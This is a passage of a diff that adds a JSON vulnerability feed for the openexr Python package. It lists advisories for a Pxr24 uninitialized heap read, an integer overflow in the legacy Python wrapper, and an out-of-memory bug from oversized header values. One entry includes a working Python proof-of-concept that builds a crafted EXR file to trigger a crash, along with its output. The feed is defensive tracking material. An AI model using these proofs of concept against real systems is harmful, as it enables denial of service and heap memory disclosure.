uncompressed_size (the header-derived expected size).\nfor (int y = 0; y < decode->chunk.height; ++y) { ... }\n```\nAfter exr_uncompress_buffer() returns success, the code does not verify whether the actual decompressed size (outSize) matches the expected size (uncompressed_size). The subsequent byte-plane reconstruction loop reads from the scratch buffer up to uncompressed_size bytes. As a result, the region between outSize and uncompressed_size consists of uninitialized heap memory, which is then read by the decoder.\n\n**Affected component**\n- src/lib/OpenEXRCore/internal_pxr24.c \u2014 undo_pxr24_impl() (line 261\u2013399)\n- src/lib/OpenEXRCore/compression.c \u2014 exr_uncompress_buffer() (line 202\u2013205)\n\n### PoC\nPlease refer to the atta\n[poc.zip](https://github.com/user-attachments/files/26002361/poc.zip)\nched archive file and proceed after extracting it.\n\n1. git clone https://github.com/AcademySoftwareFoundation/openexr.git\n2. mv poc openexr/\n3. cd openexr\n4. docker build -f poc/Dockerfile -t pxr24-poc .\n5. docker run --rm pxr24-poc\n\n<img width=\"858\" height=\"155\" alt=\"\u1109\u1173\u110f\u1173\u1105\u1175\u11ab\u1109\u1163\u11ba 2026-03-15 \u110b\u1169\u1112\u116e 4 38 18\" src=\"https://github.com/user-attachments/assets/ded9eab6-9b92-40f7-9a0d-7b00db7e6088\" />\n\n\n### Impact\n* Sensitive information from heap memory may be leaked through the decoded pixel data (information disclosure).\nTrigger Condition: Occurs under default settings; simply reading a malicious EXR file is sufficient to trigger the issue, without any user interaction.",
+      "published": "2026-04-03T21:50:14Z",
+      "modified": "2026-04-07T17:46:13.966211052Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vc68-257w-m432"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34543"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/5f6d0aaa9e43802917af7db90f181e88e083d3b8"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-vc68-257w-m432",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.4.0"
+            },
+            {
+              "fixed": "3.4.8"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "3.4.3",
+        "3.4.4",
+        "3.4.5",
+        "3.4.6",
+        "3.4.7"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0",
+        "3.4.4",
+        "3.4.5",
+        "3.4.6",
+        "3.4.7"
+      ]
+    },
+    {
+      "id": "GHSA-vh63-9mqx-wmjr",
+      "primary_id": "CVE-2025-64182",
+      "aliases": [
+        "CVE-2025-64182"
+      ],
+      "cve_ids": [
+        "CVE-2025-64182"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR has buffer overflow in PyOpenEXR_old's channels() and channel()",
+      "details": "### Summary\n\nA memory safety bug in the legacy OpenEXR Python adapter (the deprecated OpenEXR.InputFile wrapper) allow crashes and likely code execution when opening attacker-controlled EXR files or when passing crafted Python objects.\n\nInteger overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit).\n\nThis bug was found with [ZeroPath](https://zeropath.com/?utm_source=joshua.hu).\n\n### Details\n\nInteger overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit), around [here](https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536).\n\n-   In `channel()`:\n\n    -   Width and height are derived from the header dataWindow using `int`.\n\n    -   `typeSize` is a `size_t`. The buffer size is computed as `typeSize * width * height` with no bounds checks.\n\n    -   The result is passed to `PyString_FromStringAndSize(NULL, size)` which maps to `PyBytes_FromStringAndSize`. That function expects `Py_ssize_t`. If the product overflows or exceeds `PY_SSIZE_T_MAX`, allocation fails or the value wraps.\n\n    -   The return value is not checked. The code immediately calls `PyString_AsString(r)` and proceeds to build a `FrameBuffer` and calls `readPixels(miny, maxy)`.\n\n    -   On 64 bit: `PyBytes_FromStringAndSize` returns NULL, the wrapper dereferences NULL and crashes.\\\n        On 32 bit: the multiplication can wrap to a small positive size, producing a too-small allocation, after which `readPixels` writes `typeSize * width` bytes per scanline for `height` lines into that buffer, causing a heap overflow.\n\n-   In `channels()` the same pattern appears for each requested channel. It also ignores per-channel subsampling when computing the allocation and when inserting the `Slice` it hardcodes `xSampling=1, ySampling=1`. If a file actually has subsampled channels this makes the stride and allocation inconsistent, which can also lead to over or under writes.\n\n### PoC\n\n```python\n# write_big_header_then_crash.py\nimport OpenEXR, Imath\n\n# OpenEXR sanity clamp for header coords is about INT_MAX/2 - 1\nINT_MAX = (1 << 31) - 1\nMAX_COORD = (INT_MAX // 2) - 1  # 1073741822\n\n# Choose a scanline width that keeps row-bytes < 2^31\n# 400,000,000 * 4 bytes = ~1.6 GB per scanline, which many codecs accept\nWIDTH = min(400_000_000, MAX_COORD + 1)   # pixels\nHEIGHT = 64                                # small height keeps the file tiny\n\n# Build windows from pixel counts\ndw = Imath.Box2i(Imath.V2i(0, 0), Imath.V2i(WIDTH - 1, HEIGHT - 1))\n\n# Robustly set NO_COMPRESSION across enum naming differences\ndef no_compression():\n    # Try common names, else fallback to numeric 0\n    C = Imath.Compression\n    for name in (\"NO_COMPRESSION\", \"NONE\", \"NO_COMPRESSION_ENUM\"):\n        if hasattr(C, name):\n            return Imath.Compression(getattr(C, name))\n    return Imath.Compression(0)\n\nhdr = {\n    \"dataWindow\": dw,\n    \"displayWindow\": dw,\n    \"channels\": {\"R\": Imath.Channel(Imath.PixelType(Imath.PixelType.FLOAT))},\n    \"compression\": no_compression(),\n    \"lineOrder\": Imath.LineOrder(Imath.LineOrder.INCREASING_Y),\n}\n\n# Write just the header (no pixels)\nout = OpenEXR.OutputFile(\"big_header.exr\", hdr)\nout.close()\n\n# Now trigger the legacy bug: huge allocation request returns NULL, code fails to check\nf = OpenEXR.InputFile(\"big_header.exr\")\nprint(\"Triggering crash...\")\nf.channels([\"R\"])\n```\n\n```\n$ python3 poc.py \nTriggering crash...\nlibc++abi: terminating due to uncaught exception of type Iex_3_4::InputExc: Unable to query scanline information\nAbort trap: 6              python3 poc.py\n```\n\n### Impact\nTypical memory stuff.",
+      "published": "2026-04-06T17:51:19Z",
+      "modified": "2026-04-06T18:01:16.493192Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64182"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-vh63-9mqx-wmjr",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.2.0"
+            },
+            {
+              "fixed": "3.2.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.2.3",
+        "3.2.4"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0"
+      ]
+    },
+    {
+      "id": "GHSA-x22w-82jp-8rvf",
+      "primary_id": "CVE-2025-48074",
+      "aliases": [
+        "CVE-2025-48074"
+      ],
+      "cve_ids": [
+        "CVE-2025-48074"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR Out-Of-Memory via Unbounded File Header Values",
+      "details": "### Summary\nThe OpenEXR file format defines many information about the final image inside of the file header, such as the size of data/display window.\n\nThe application trusts the value of `dataWindow` size provided in the header of the input file, and performs computations based on this value.\n\nThis may result in unintended behaviors, such as excessively large number of iterations and/or huge memory allocations.\n\n\n### Details\nA concrete example of this issue is present in the function `readScanline()` in `ImfCheckFile.cpp` at line 235, that performs a for-loop using the `dataWindow min.y` and `max.y` coordinates that can be arbitrarily large.\n\n```cpp\nin.setFrameBuffer (i);\n\nint step = 1;\n\n//\n// try reading scanlines. Continue reading scanlines\n// even if an exception is encountered\n//\nfor (int y = dw.min.y; y <= dw.max.y; y += step) // <-- THIS LOOP IS EXCESSIVE BECAUSE OF DW.MAX\n{\n    try\n    {\n        in.readPixels (y);\n    }\n    catch (...)\n    {\n        threw = true;\n\n        //\n        // in reduceTime mode, fail immediately - the file is corrupt\n        //\n        if (reduceTime) { return threw; }\n    }\n}\n```\n\nAnother example occurs in the `EnvmapImage::resize` function that in turn calls `Array2D<T>::resizeEraseUnsafe` passing the `dataWindow` X and Y coordinates and perform a huge allocation.\n\nOn some system, the allocator will simply return `std::bad_alloc` and crash. On other systems such as macOS, the allocator will happily continue with a \"small\" pre-allocation and allocate further memory whenever it is accessed.\nThis is the case with the `EnvmapImage::clear` function that is called right after and fills the image RGB values with zeros, allocating tens of Gigabytes.\n\n### PoC\n\nNOTE: please download the `oom_crash.exr` file via the following link:\n \nhttps://github.com/ShielderSec/poc/tree/main/CVE-2025-48074\n\n1. Compile the `exrcheck` binary in a macOS or GNU/Linux machine with ASAN.\n2. Open the `oom_crash.exr` file with the following command:\n\n```\nexrcheck oom_crash.exr\n```\n\n3. Notice that `exrenvmap`/`exrcheck` crashes with ASAN stack-trace.\n\n### Impact\nAn attacker could cause a denial of service by stalling the application or exhaust memory by stalling the application in a loop which contains a memory leakage.",
+      "published": "2025-07-31T19:23:18Z",
+      "modified": "2025-08-01T18:35:51Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-x22w-82jp-8rvf"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48074"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ShielderSec/poc/tree/main/CVE-2025-48074"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-x22w-82jp-8rvf",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.2"
+            },
+            {
+              "fixed": "3.3.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.3.2"
+      ],
+      "affected_conda_versions": [
+        "3.3.2"
+      ]
+    }
+  ]
+}
